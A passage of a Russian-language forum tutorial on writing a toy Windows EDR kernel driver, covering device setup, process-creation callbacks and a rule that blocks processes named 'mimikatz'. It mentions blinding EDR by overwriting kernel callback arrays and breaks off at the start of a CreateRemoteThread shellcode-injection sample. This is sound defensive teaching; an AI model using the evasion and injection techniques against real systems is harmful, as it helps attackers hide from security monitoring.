+		<img src="../../attachments/1750610976318-png.688/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610976318.png"
+			title="1750610976318.png"
+			width="234" height="282" loading="lazy" />
+	</div><br />
+<br />
+Создайте новый исходный файл, назовите его &quot;driver.c&quot; и добавьте следующее содержание (я вернусь к тому, что это делает позже):<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Ntifs.h&gt;
+#include &lt;ntddk.h&gt;
+#include &lt;wdf.h&gt;
+
+// Global variables
+UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\Device\\MyDumbEDR&quot;); // Driver device name
+UNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\??\\MyDumbEDR&quot;);        // Device symlink
+
+void UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\n&quot;);
+    // Delete the driver device
+    IoDeleteDevice(DriverObject-&gt;DeviceObject);
+    // Delete the symbolic link
+    IoDeleteSymbolicLink(&amp;SYM_LINK);
+}
+
+NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
+    // Prevent compiler error in level 4 warnings
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Initializing the driver\n&quot;);
+
+    // Variable that will store the output of WinAPI functions
+    NTSTATUS status;
+
+    // Initializing a device object and creating it
+    PDEVICE_OBJECT DeviceObject;
+    UNICODE_STRING deviceName = DEVICE_NAME;
+    UNICODE_STRING symlinkName = SYM_LINK;
+    status = IoCreateDevice(
+        DriverObject,            // Our driver object
+        0,                        // Extra bytes needed (we don&#039;t need any)
+        &amp;deviceName,            // The device name
+        FILE_DEVICE_UNKNOWN,    // The device type
+        0,                        // Device characteristics (none)
+        FALSE,                    // Sets the driver to not exclusive
+        &amp;DeviceObject            // Pointer in which is stored the result of IoCreateDevice
+    );
+
+    if (!status) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\n&quot;);
+        return status;
+    }
+
+    // Creating the symlink that we will use to contact our driver
+    status = IoCreateSymbolicLink(
+        &amp;symlinkName, // The symbolic link name
+        &amp;deviceName   // The device name
+    );
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\n&quot;);
+        IoDeleteDevice(DeviceObject);
+        return status;
+    }
+
+    // Setting the unload routine to execute
+    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;
+
+    return status;
+}</code></pre>
+	</div>
+</div><br />
+В свойствах проекта перейдите в раздел &quot;Linker &gt; Command Line&quot; и добавьте следующую опцию, которая отключит проверку целостности:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750610993107.png"
+		data-src="https://osint42.org/attachments/1750610993107-png.689/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750610993107-png.689/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750610993107.png"
+			title="1750610993107.png"
+			width="774" height="540" loading="lazy" />
+	</div><br />
+<br />
+На этом этапе среда готова для сборки драйвера. Скомпилируйте проект и выполните следующие команды в командной строке с административными правами (очевидно, отрегулируйте пути и имена по необходимости):<br />
+<br />
+sc.exe create MyDumbEDR type=kernel binPath=C:\Users\windev\Desktop\x64\Debug\MyDumbEDR.sys sc.exe start MyDumbEDR<br />
+<br />
+Вот вывод, который вы получите в своей командной строке:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611005317.png"
+		data-src="https://osint42.org/attachments/1750611005317-png.690/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611005317-png.690/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611005317.png"
+			title="1750611005317.png"
+			width="1024" height="259" loading="lazy" />
+	</div><br />
+<br />
+И если у вас открыта dbgview, вы должны увидеть, как ваш драйвер говорит &quot;привет&quot;:<br />
+<br />
+<div class="bbMediaWrapper" data-media-site-id="youtube" data-media-key="sa9zQhB5CsU">
+	<div class="bbMediaWrapper-inner">
+		<iframe src="https://www.youtube.com/embed/sa9zQhB5CsU?wmode=opaque"
+				loading="lazy"
+				width="560" height="315"
+				frameborder="0" allowfullscreen="true"></iframe>
+	</div>
+</div><br />
+Отлично! Теперь, когда драйвер работает, давайте рассмотрим содержимое базового ядерного драйвера Windows!<br />
+<br />
+<b>V/ Разработка драйвера ядра Windows</b><br />
+<br />
+Драйвер, как и любые исполняемые файлы, состоит из главной функции, называемой DriverEntry, которая имеет следующий прототип:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS DriverEntry(
+    PDRIVER_OBJECT  DriverObject,
+    PUNICODE_STRING RegistryPath
+);</code></pre>
+	</div>
+</div><br />
+С параметрами:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>//0x150 bytes (sizeof)
+struct _DRIVER_OBJECT
+{
+    SHORT Type;                                                                    //0x0
+    SHORT Size;                                                                    //0x2
+    struct _DEVICE_OBJECT* DeviceObject;                                           //0x8
+    ULONG Flags;                                                                   //0x10
+    VOID* DriverStart;                                                             //0x18
+    ULONG DriverSize;                                                              //0x20
+    VOID* DriverSection;                                                           //0x28
+    struct _DRIVER_EXTENSION* DriverExtension;                                     //0x30
+    struct _UNICODE_STRING DriverName;                                             //0x38
+    struct _UNICODE_STRING* HardwareDatabase;                                      //0x48
+    struct _FAST_IO_DISPATCH* FastIoDispatch;                                      //0x50
+    LONG (*DriverInit)(struct _DRIVER_OBJECT* arg1, struct _UNICODE_STRING* arg2); //0x58
+    VOID (*DriverStartIo)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);         //0x60
+    VOID (*DriverUnload)(struct _DRIVER_OBJECT* arg1);                             //0x68
+    LONG (*MajorFunction[28])(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);     //0x70
+};</code></pre>
+	</div>
+</div><br />
+RegistryPath: указатель на строку Unicode, содержащую путь к ключу параметров драйвера, который обычно находится в следующем реестровом ключе:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HKLM:\SYSTEM\CurrentControlSet\Service</code></pre>
+	</div>
+</div><br />
+Если мы рассмотрим содержимое функции DriverEntry, то увидим, что, помимо функций DbgPrintEx, используемых для вывода сообщений в dbgview, вызываются две функции:<br />
+<br />
+IoCreateDevice: используется для создания объекта устройства, представляющего наш драйвер.<br />
+IoCreateSymbolicLink: используется для создания символической ссылки, которую мы будем использовать для связи с нашим драйвером.<br />
+<br />
+Эти функции - обязательные для указания функции, необходимые для загрузки драйвера в системе.<br />
+<br />
+Вторая важная строка указывает процедуру, которую следует выполнять при выгрузке драйвера:<br />
+<br />
+DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;<br />
+<br />
+В нашем коде эта процедура представлена следующей функцией:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;
+
+In our code, the routine is the following function:
+
+void UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\n&quot;);
+    // Delete the driver device
+    IoDeleteDevice(DriverObject-&gt;DeviceObject);
+    // Delete the symbolic link
+    IoDeleteSymbolicLink(&amp;SYM_LINK);
+}</code></pre>
+	</div>
+</div><br />
+Как видите, это точное противоположность загрузочной процедуре: она удаляет устройство и символическую ссылку. И вот, на данном этапе у нас есть работающий ядерный драйвер. Пока он ничего не делает, но он работает. Теперь давайте реализуем один из первых механизмов, используемых EDR для мониторинга системы: объекты обратного вызова!<br />
+<br />
+<b>VI/ Реализация функции обратного вызова</b><br />
+<br />
+Как мы видели ранее, функции обратного вызова - это функции, которые могут использоваться драйвером для регистрации так называемого ядерного обратного вызова. Основная идея ядерного обратного вызова заключается в том, что каждый раз, когда выполняется определенное действие в системе, ядро информирует драйвер, зарегистрировавший обратный вызов, о том, что выполняется действие.<br />
+<br />
+Для регистрации такого ядерного обратного вызова вы можете использовать функцию обратного вызова, которая позволит вам отслеживать конкретные события. Самые известные функции обратного вызова включают:<br />
+<br />
+PsSetCreateProcessNotifyRoutine: используется для мониторинга создания процессов<br />
+PsSetLoadImageNotifyRoutine: используется для мониторинга загрузки DLL<br />
+PsSetThreadCreateNotifyRoutine: используется для мониторинга создания потоков<br />
+ObRegisterCallbacks: используется для мониторинга вызовов функций OpenProcess, OpenThread и OpenDesktop<br />
+CmRegisterCallbacks: используется для мониторинга создания, изменения и удаления ключей реестра.<br />
+IoRegisterShutdown: мониторинг выключения компьютера<br />
+IoRegisterFsRegistrationChange: мониторинг изменений в файле<br />
+<br />
+Ниже вы найдете схему, которая подводит итоги процесса регистрации функции обратного вызова для мониторинга создания процессов:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611029077.png"
+		data-src="https://osint42.org/attachments/1750611029077-png.691/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611029077-png.691/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611029077.png"
+			title="1750611029077.png"
+			width="790" height="529" loading="lazy" />
+	</div><br />
+<br />
+Как видите, информация о создании процесса очень интересна и важна для EDR. По этой причине каждый драйвер EDR регистрирует ядерные обратные вызовы для мониторинга создания процессов с помощью функции PsSetCreateProcessNotifyRoutine. Ее прототип следующий:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS PsSetCreateProcessNotifyRoutine(
+    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, // Pointer to the function to execute when a process is created
+    BOOLEAN                        Remove         // Whether the routine specified by NotifyRoutine should be added to or removed from the system&#039;s list of notification routines
+);</code></pre>
+	</div>
+</div><br />
+Довольно просто, верно? Первый аргумент - это указатель на процедуру, которая будет выполняться каждый раз, когда драйвер получает уведомление от ядра, в то время как второй аргумент указывает, должен ли обратный вызов быть зарегистрирован или отменен. В следующем коде эта процедура - это функция CreateProcessNotifyRoutine:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Ntifs.h&gt;
+#include &lt;ntddk.h&gt;
+#include &lt;wdf.h&gt;
+
+// Global variables
+UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\Device\\MyDumbEDR&quot;); // Internal device name
+UNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\??\\MyDumbEDR&quot;);        // Symlink
+
+// handle incoming notifications about new/terminated processes
+void CreateProcessNotifyRoutine(HANDLE ppid, HANDLE pid, BOOLEAN create){
+    if (create){
+        PEPROCESS process = NULL;
+        PUNICODE_STRING processName = NULL;
+
+        // Retrieve process ID
+        PsLookupProcessByProcessId(pid, &amp;process);
+
+        // Retrieve the process name from the EPROCESS structure
+        SeLocateProcessImageName(process, &amp;processName);
+
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: %d (%wZ) launched.\n&quot;, pid, processName);
+    }
+    else{
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: %d got killed.\n&quot;, pid);
+    }
+}
+
+void UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\n&quot;);
+    // Unset the callback
+    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);
+    // Delete the driver device
+    IoDeleteDevice(DriverObject-&gt;DeviceObject);
+    // Delete the symbolic link
+    IoDeleteSymbolicLink(&amp;SYM_LINK);
+}
+
+NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath){
+    // Prevent compiler error in level 4 warnings
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Initializing the driver\n&quot;);
+
+    // Variable that will store the output of WinAPI functions
+    NTSTATUS status;
+
+    // Setting the unload routine to execute
+    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;
+   
+    // Initializing a device object and creating it
+    PDEVICE_OBJECT DeviceObject;
+    UNICODE_STRING deviceName = DEVICE_NAME;
+    UNICODE_STRING symlinkName = SYM_LINK;
+    status = IoCreateDevice(
+        DriverObject,           // our driver object,
+        0,                       // no need for extra bytes,
+        &amp;deviceName,           // the device name,
+        FILE_DEVICE_UNKNOWN,   // device type,
+        0,                       // characteristics flags,
+        FALSE,                   // not exclusive,
+        &amp;DeviceObject           // the resulting pointer
+    );
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\n&quot;);
+        return status;
+    }
+
+    // Creating the symlink that we will use to contact our driver
+    status = IoCreateSymbolicLink(&amp;symlinkName, &amp;deviceName);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\n&quot;);
+        IoDeleteDevice(DeviceObject);
+        return status;
+    }
+
+    PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);
+   
+    return STATUS_SUCCESS;
+}</code></pre>
+	</div>
+</div><br />
+Соберите драйвер, запустите его, откройте DbgView и запустите любой процесс, который вам нужен. Если все прошло хорошо, вы должны увидеть отладочные сообщения в DbgView, печатающие PID, а также имя процесса, который запускается или завершается:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611046062.png"
+		data-src="https://osint42.org/attachments/1750611046062-png.692/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611046062-png.692/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611046062.png"
+			title="1750611046062.png"
+			width="761" height="38" loading="lazy" />
+	</div><br />
+<br />
+Быть в курсе создания процесса действительно интересно, но нам нужно разработать логику, которая позволит нашему EDR определить, следует ли создавать целевой процесс вообще. Для этого нам придется использовать расширенную функцию PsSetCreateProcessNotifyRoutineEx, называемую PsSetCreateProcessNotifyRoutineEx. Прототип этой функции следующий:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS PsSetCreateProcessNotifyRoutineEx(
+PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, // Указатель на структуру PCreateProcessNotifyRoutineEx
+BOOLEAN Remove // Добавить или удалить обратный вызов
+);</code></pre>
+	</div>
+</div><br />
+На первый взгляд функции PsSetCreateProcessNotifyRoutineEx и PsSetCreateProcessNotifyRoutine выглядят одинаково, но когда мы ближе рассмотрим первый аргумент PsSetCreateProcessNotifyRoutineEx, мы увидим, что структура немного сложнее:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>PCREATE_PROCESS_NOTIFY_ROUTINE PcreateProcessNotifyRoutine;
+void PcreateProcessNotifyRoutineEx(
+PEPROCESS Process, // Указатель на структуру EPROCESS
+HANDLE ProcessId, // PID процесса
+PPS_CREATE_NOTIFY_INFO CreateInfo // Структура процесса, содержащая информацию о запускаемом процессе
+)</code></pre>
+	</div>
+</div><br />
+Третья переменная содержит информацию о запускаемом процессе, такую как его командная строка, PID его родительского процесса, имя его исполняемого файла и так далее:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PS_CREATE_NOTIFY_INFO {
+    SIZE_T              Size;
+    union {
+        ULONG Flags;
+        struct {
+            ULONG FileOpenNameAvailable : 1;  //
+            ULONG IsSubsystemProcess : 1;    
+            ULONG Reserved : 30;
+        };
+    };
+    HANDLE              ParentProcessId;     // Parent PID
+    CLIENT_ID           CreatingThreadId;    // Thread id
+    struct _FILE_OBJECT *FileObject;
+    PCUNICODE_STRING    ImageFileName;       // Name of the binary
+    PCUNICODE_STRING    CommandLine;         // Arguments passed to the binary
+    NTSTATUS            CreationStatus;      // This variable holds whether or not the process should be created
+} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;</code></pre>
+	</div>
+</div><br />
+Интересно то, что переменная CreationStatus - это место, где драйвер будет хранить свое решение (разрешать или запрещать создание процесса). Эта переменная может содержать два значения:<br />
+<br />
+STATUS_SUCCESS: драйвер информирует ядро, что процесс можно запустить<br />
+STATUS_ACCESS_DENIED: драйвер информирует ядро, что процесс не может быть запущен<br />
+<br />
+Вот окончательная реализация механизма ядерного обратного вызова в нашем примитивном EDR:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Ntifs.h&gt;
+#include &lt;ntddk.h&gt;
+#include &lt;wdf.h&gt;
+
+// Global variables
+UNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L&quot;\\Device\\MyDumbEDR&quot;); // Internal device name
+UNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L&quot;\\??\\MyDumbEDR&quot;);        // Symlink
+
+// Handle incoming notifications about new/terminated processes
+void CreateProcessNotifyRoutine(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo) {
+    UNREFERENCED_PARAMETER(process);
+    UNREFERENCED_PARAMETER(pid);
+   
+    // Never forget this if check because if you don&#039;t, you&#039;ll end up crashing your Windows system ;P
+    if (createInfo != NULL) {
+        // Compare the command line of the launched process to the notepad string
+        if (wcsstr(createInfo-&gt;CommandLine-&gt;Buffer, L&quot;notepad&quot;) != NULL){
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Process (%ws) allowed.\n&quot;, createInfo-&gt;CommandLine-&gt;Buffer);
+            // Process allowed
+            createInfo-&gt;CreationStatus = STATUS_SUCCESS;
+        }
+
+        // Compare the command line of the launched process to the mimikatz string
+        if (wcsstr(createInfo-&gt;CommandLine-&gt;Buffer, L&quot;mimikatz&quot;) != NULL) {
+            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Process (%ws) denied.\n&quot;, createInfo-&gt;CommandLine-&gt;Buffer);
+            // Process denied
+            createInfo-&gt;CreationStatus = STATUS_ACCESS_DENIED;
+        }
+    }
+}
+
+void UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, &quot;MyDumbEDR: Unloading routine called\n&quot;);
+    // Unset the callback
+    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);
+    // Delete the driver device
+    IoDeleteDevice(DriverObject-&gt;DeviceObject);
+    // Delete the symbolic link
+    IoDeleteSymbolicLink(&amp;SYM_LINK);
+}
+
+NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
+    // Prevent compiler error in level 4 warnings
+    UNREFERENCED_PARAMETER(RegistryPath);
+
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Initializing the driver\n&quot;);
+
+    // Variable that will store the output of WinAPI functions
+    NTSTATUS status;
+
+    // Setting the unload routine to execute
+    DriverObject-&gt;DriverUnload = UnloadMyDumbEDR;
+
+    // Initializing a device object and creating it
+    PDEVICE_OBJECT DeviceObject;
+    UNICODE_STRING deviceName = DEVICE_NAME;
+    UNICODE_STRING symlinkName = SYM_LINK;
+    status = IoCreateDevice(
+        DriverObject,           // our driver object,
+        0,                       // no need for extra bytes,
+        &amp;deviceName,           // the device name,
+        FILE_DEVICE_UNKNOWN,   // device type,
+        0,                       // characteristics flags,
+        FALSE,                   // not exclusive,
+        &amp;DeviceObject           // the resulting pointer
+    );
+
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Device creation failed\n&quot;);
+        return status;
+    }
+
+    // Creating the symlink that we will use to contact our driver
+    status = IoCreateSymbolicLink(&amp;symlinkName, &amp;deviceName);
+    if (!NT_SUCCESS(status)) {
+        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Symlink creation failed\n&quot;);
+        IoDeleteDevice(DeviceObject);
+        return status;
+    }
+
+    // Registers the kernel callback
+    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, FALSE);
+
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, &quot;MyDumbEDR: Driver created\n&quot;);
+    return STATUS_SUCCESS;
+}</code></pre>
+	</div>
+</div><br />
+Логика довольно примитивна, но в демонстрационных целях, если имя исполняемого файла создаваемого процесса - &quot;mimikatz&quot;, то EDR блокирует создание этого процесса:<br />
+<br />
+<div class="bbMediaWrapper" data-media-site-id="youtube" data-media-key="q6JwH-oYmHc">
+	<div class="bbMediaWrapper-inner">
+		<iframe src="https://www.youtube.com/embed/q6JwH-oYmHc?wmode=opaque"
+				loading="lazy"
+				width="560" height="315"
+				frameborder="0" allowfullscreen="true"></iframe>
+	</div>
+</div><br />
+Как видите, notepad.exe разрешен, в то время как mimikatz.exe запрещен, отлично!<br />
+<br />
+Теперь, чтобы немного глубже понять механизм ядерных обратных вызовов, мы можем задаться вопросом, как ядро узнает, зарегистрировал ли драйвер ядерный обратный вызов?<br />
+<br />
+Для каждого функционального обратного вызова, о которых мы упоминали ранее, существует массив в ядерной памяти, который хранит указатели на обратные вызовы (такие, как обратные вызовы от EDR):<br />
+<br />
+С помощью WinDBG.exe мы можем проверить фактическое содержание этих массивов. Например, на следующем скриншоте видно, что массив PspCreateProcessNotifyRoutine содержит 9 шестнадцатеричных адресов, следовательно, 9 ядерных обратных вызовов:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611063887.png"
+		data-src="https://osint42.org/attachments/1750611063887-png.693/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611063887-png.693/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611063887.png"
+			title="1750611063887.png"
+			width="494" height="157" loading="lazy" />
+	</div><br />
+<br />
+Поэтому каждый раз, когда запускается процесс, ядро считывает массив PspCreateProcessNotifyRoutine и для каждого из 9 указателей отправляет уведомление о создании процесса. Как атакующему, эти массивы представляют особый интерес, потому что, если вы можете перезаписать их или удалить указатели, вы фактически сможете &quot;ослепить&quot; EDR и, следовательно, предотвратить его мониторинг системы (<a href="https://github.com/br-sn/CheekyBlinder" target="_blank" class="link link--external" rel="noopener">и уже есть довольно крутой инструмент, который позволяет это делать, CheekyBlinder).</a><br />
+<br />
+На этом этапе наш драйвер способен отслеживать создание процессов и блокировать его, если имя исполняемого файла - &quot;mimikatz&quot;. Очевидно, что эта логика недостаточно, потому что если вы переименуете mimikatz.exe в notmimikatz.exe, вы обойдете проверку. Поэтому нам придется разработать более сложную процедуру обнаружения.<br />
+<br />
+<b>VII/ От теоретических ядерных обратных вызовов до полноценной системы обнаружения и реакции</b><br />
+<br />
+Знание того, что процесс создан в системе, интересно, но если мы не действуем на основе этой информации, она бесполезна. Как разработчики средств безопасности нам нужно реализовать некоторую логику, которая позволит нам определить, является ли этот процесс законным или нет. Из соображений безопасности и стабильности (в основном потому, что разработка в пространстве ядра - это кошмар), каждый EDR полагается на агент пространства пользователя, который оркестрирует всю решение EDR. Этот агент, как правило, выполняет как минимум две вещи:<br />
+<br />
+Он анализирует бинарные файлы, запускаемые на системе, статически.<br />
+Он внедряет собственную DLL в процесс, чтобы отслеживать вызовы API.<br />
+<br />
+Таким образом, более реалистичная, хотя и упрощенная, схема работы EDR может выглядеть следующим образом:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1750611076048.png"
+		data-src="https://osint42.org/attachments/1750611076048-png.694/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1750611076048-png.694/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1750611076048.png"
+			title="1750611076048.png"
+			width="792" height="625" loading="lazy" />
+	</div><br />
+<br />
+Драйвер ядра получает уведомления о выполнении конкретных действий в системе с помощью механизма ядерных обратных вызовов, затем он передает их агенту, где разрабатывается большая часть логики обнаружения.<br />
+<br />
+Поэтому нам нужно разработать собственного агента пространства пользователя, который будет анализировать систему. Но прежде чем двигаться дальше, давайте определимся с нашими ожиданиями от нашего EDR. На данный момент единственное, что я хотел, чтобы MyDumbEDR могла обнаруживать, это бинарные файлы, которые пытаются внедрить шелл-код в удаленный процесс, используя следующую простую технику CreateRemoteThread:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &quot;stdio.h&quot;
+#include &lt;Windows.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+int get_process_id_from_szexefile(wchar_t processName[]) {
+    PROCESSENTRY32 entry = { 0 };
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (Process32First(snapshot, &amp;entry) == TRUE) {
+        while (Process32Next(snapshot, &amp;entry) == TRUE) {
